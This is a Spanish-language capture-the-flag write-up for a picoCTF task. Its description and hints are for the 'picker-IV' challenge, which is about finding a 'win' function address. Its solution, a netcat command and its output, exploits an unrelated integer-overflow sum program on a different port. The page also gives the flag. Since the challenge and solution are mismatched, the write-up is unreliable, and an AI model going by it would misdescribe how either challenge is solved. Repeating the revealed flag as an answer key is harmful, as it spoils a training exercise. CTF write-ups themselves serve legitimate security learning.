## Descripción

Can you figure out how this program works to get the flag?Connect to the program with netcat:`$ nc saturn.picoctf.net 65506`The program's source code can be downloaded [here](https://artifacts.picoctf.net/c/527/picker-IV.c). The binary can be downloaded [here](https://artifacts.picoctf.net/c/527/picker-IV).

## Pistas

1. With Python, there are no binaries. With compiled languages like C, there is source code, and there are binaries. Binaries are created from source code, they are a conversion from the human-readable source code, to the highly efficient machine language, in this case: x86_64.2
2. How can you find the address that `win` is at?

## Solución

```python()
1. Descargamos y analizamos el código buscando algún error en el manejo de datos de entrada, operaciones, asignaciones, etc.
2. Encontramods que el programa solicita dos números enteros y los suma, si la suma es menor que cualquiera de los valores de entrada, se elimina la bandera. 
3. Seleccione dos números (2147483647 y 1) que desborden el rango positivo máximo de un entero con signo cuando se suman, el primero muy cerca (o igual) del máximo, el segundo lo suficiente como para desbordarse, de modo que la suma sea menor que el primer número.
4. Ingresamos los número anteriores al programa:
```

```bash()
$ echo -e "2147483647\n1" | nc saturn.picoctf.net 57395
n1 > n1 + n2 OR n2 > n1 + n2 
What two positive numbers can make this possible: 
You entered 2147483647 and 1
You have an integer overflow
YOUR FLAG IS: picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_ccd078bd}
```

## Bandera

picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_ccd078bd}

## Notas adicionales